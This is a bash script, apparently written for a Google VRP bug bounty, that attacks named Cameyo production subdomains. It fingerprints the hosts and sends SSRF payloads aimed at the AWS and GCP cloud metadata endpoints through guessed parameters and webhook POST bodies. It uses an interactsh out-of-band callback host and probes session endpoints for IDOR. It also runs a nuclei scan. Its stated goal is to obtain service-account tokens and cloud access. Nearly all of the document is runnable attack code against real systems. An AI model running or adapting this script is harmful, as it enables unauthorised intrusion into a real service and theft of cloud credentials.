#!/usr/bin/env bash
# cameyo-ssrf-attack.sh
# Targeted SSRF + IDOR attack on Cameyo — TIER0, Google VRP.
#
# Primary hypothesis: gwebhook.svc.cameyo.com makes outbound HTTP requests
# to user-supplied webhook URLs → SSRF → cloud metadata (GCP/AWS) → credentials
# Secondary: session.svc.cameyo.com IDOR on session tokens
# Tertiary: online.cameyo.com file upload, authentication bypass
#
# Run from Pi: INTERACTSH_URL=https://xxx.interact.sh bash scripts/cameyo-ssrf-attack.sh
set -euo pipefail

OUT="results/cameyo.com"
mkdir -p "$OUT/evidence"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
CANARY="${INTERACTSH_URL:-}"

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
hit()  { echo -e "${RED}[HIT]${NC} $*"; }
ok()   { echo -e "${GREEN}[OK]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
warn() { echo -e "${YELLOW}[?]${NC} $*"; }

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  Cameyo SSRF + IDOR Attack — TIER0, Google VRP           ${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""
[ -z "$CANARY" ] && warn "INTERACTSH_URL not set — SSRF will be blind. Run: interactsh-client -v"
echo ""

# ─── Phase 0: Fingerprint all Cameyo subdomains ─────────────────────────────
info "Phase 0: Fingerprinting Cameyo attack surface"
TARGETS=(
  "cameyo.com"
  "online.cameyo.com"
  "marketplace.cameyo.com"
  "gwebhook.svc.cameyo.com"
  "session.svc.cameyo.com"
  "support.svc.cameyo.com"
  "getip.svc.cameyo.com"
  "kb.svc.cameyo.com"
)

for t in "${TARGETS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -L --max-redirs 3 \
    -H "User-Agent: $UA" "https://$t/" 2>/dev/null)
  TITLE=$(curl -sk -L --max-redirs 3 -H "User-Agent: $UA" "https://$t/" 2>/dev/null \
    | grep -oiP '(?<=<title>)[^<]+' | head -1 || true)
  echo "  $t → HTTP $CODE | $TITLE" | tee -a "$OUT/evidence/fingerprint.txt"
done
echo ""

# ─── Phase 1: getip.svc.cameyo.com — IP lookup service ─────────────────────
info "Phase 1: getip.svc.cameyo.com — IP lookup service (SSRF vector)"
# A service that fetches external IPs often makes server-side HTTP requests
GETIP_RESP=$(curl -sk -H "User-Agent: $UA" "https://getip.svc.cameyo.com/" 2>/dev/null)
echo "  Response: $(echo "$GETIP_RESP" | head -c 300)" | tee "$OUT/evidence/getip-response.txt"

# Try common SSRF injection points for an IP service
for PARAM in "?ip=" "?url=" "?host=" "?target=" "?addr=" "?q="; do
  for PAYLOAD in \
    "169.254.169.254" \
    "http://169.254.169.254/latest/meta-data/" \
    "http://metadata.google.internal/computeMetadata/v1/" \
    "${CANARY:-http://169.254.169.254}"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" \
      "https://getip.svc.cameyo.com/${PARAM}$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")" \
      2>/dev/null)
    echo -n "  getip${PARAM}$PAYLOAD → HTTP $CODE"
    if [ "$CODE" = "200" ]; then
      BODY=$(curl -sk -H "User-Agent: $UA" \
        "https://getip.svc.cameyo.com/${PARAM}$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")" \
        2>/dev/null | head -c 500)
      if echo "$BODY" | grep -qiE "ami-id|instance-id|iam/security-cred|computeMetadata|aws|gcp|google"; then
        hit "SSRF → CLOUD METADATA REACHED via getip${PARAM}"
        echo "$BODY" >> "$OUT/evidence/ssrf-metadata-hit.txt"
      else
        echo " — body: $(echo "$BODY" | head -c 80)"
      fi
    else
      echo ""
    fi
  done
done
echo ""

# ─── Phase 2: gwebhook.svc.cameyo.com — Webhook handler (prime SSRF target) ─
info "Phase 2: gwebhook.svc.cameyo.com — Webhook service"
WEBHOOK_RESP=$(curl -sk -H "User-Agent: $UA" "https://gwebhook.svc.cameyo.com/" -D - 2>/dev/null)
echo "  Initial response:" && echo "$WEBHOOK_RESP" | head -15 | tee "$OUT/evidence/gwebhook-response.txt"
echo ""

# Try common webhook registration/delivery endpoints
for ep in "/" "/webhook" "/hooks" "/register" "/deliver" "/send" "/notify" "/api/webhook" "/api/hooks"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" \
    "https://gwebhook.svc.cameyo.com$ep" 2>/dev/null)
  echo "  $ep → HTTP $CODE"
  if [ "$CODE" = "200" ]; then
    BODY=$(curl -sk -H "User-Agent: $UA" "https://gwebhook.svc.cameyo.com$ep" 2>/dev/null | head -c 300)
    echo "  Body: $BODY"
    echo "$BODY" >> "$OUT/evidence/gwebhook-endpoints.txt"
  fi
done
echo ""

# POST with SSRF payload to webhook delivery endpoint
if [ -n "$CANARY" ]; then
  info "  Attempting SSRF via webhook POST payloads..."
  for ep in "/" "/webhook" "/api/webhook" "/hooks"; do
    for PAYLOAD_TYPE in \
      "{\"url\":\"$CANARY/cameyo-webhook-ssrf\"}" \
      "{\"callback_url\":\"$CANARY/cameyo-callback-ssrf\"}" \
      "{\"endpoint\":\"$CANARY/cameyo-endpoint-ssrf\"}" \
      "{\"target\":\"http://169.254.169.254/latest/meta-data/\"}" \
      "{\"webhook_url\":\"http://metadata.google.internal/computeMetadata/v1/\",\"x-google-metadata-request\":\"true\"}"; do
      CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
        -H "Content-Type: application/json" -H "User-Agent: $UA" \
        -d "$PAYLOAD_TYPE" \
        "https://gwebhook.svc.cameyo.com$ep" 2>/dev/null)
      echo "  POST $ep ${PAYLOAD_TYPE:0:40}... → HTTP $CODE"
      [ "$CODE" = "200" ] && hit "Webhook POST accepted at $ep — check OOB listener"
    done
  done
fi
echo ""

# ─── Phase 3: session.svc.cameyo.com — Session service IDOR ─────────────────
info "Phase 3: session.svc.cameyo.com — Session IDOR"
SESSION_RESP=$(curl -sk -H "User-Agent: $UA" "https://session.svc.cameyo.com/" -D - 2>/dev/null)
echo "$SESSION_RESP" | head -15 | tee "$OUT/evidence/session-response.txt"
echo ""

# Try common session/token endpoints for IDOR
for ep in "/" "/session" "/token" "/api/session" "/api/v1/session" "/sessions"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" \
    "https://session.svc.cameyo.com$ep" 2>/dev/null)
  echo "  $ep → HTTP $CODE"
done
echo ""

# ─── Phase 4: online.cameyo.com — Main portal ───────────────────────────────
info "Phase 4: online.cameyo.com — Main portal attack surface"
# Nuclei scan
if command -v nuclei >/dev/null 2>&1; then
  nuclei -u "https://online.cameyo.com" -silent \
    -tags "ssrf,idor,auth-bypass,default-login,exposure" \
    -severity "critical,high,medium" \
    -rate-limit 15 -timeout 10 \
    -j -o "$OUT/evidence/nuclei-online.jsonl" 2>/dev/null || true
  HITS=$(wc -l < "$OUT/evidence/nuclei-online.jsonl" 2>/dev/null || echo 0)
  echo "  Nuclei hits on online.cameyo.com: $HITS"
  [ "$HITS" -gt 0 ] && hit "Nuclei found $HITS issues" && cat "$OUT/evidence/nuclei-online.jsonl"
fi
echo ""

echo -e "${CYAN}═══ Cameyo Attack Summary ═══${NC}"
echo "  Evidence: $OUT/evidence/"
[ -n "$CANARY" ] && echo "  OOB listener: $CANARY — check for DNS/HTTP hits"
echo ""
echo "  SSRF chain if confirmed: SSRF → GCP metadata → service account token → cloud access"
echo "  IDOR chain if confirmed: session IDOR → access other users' virtual app sessions"
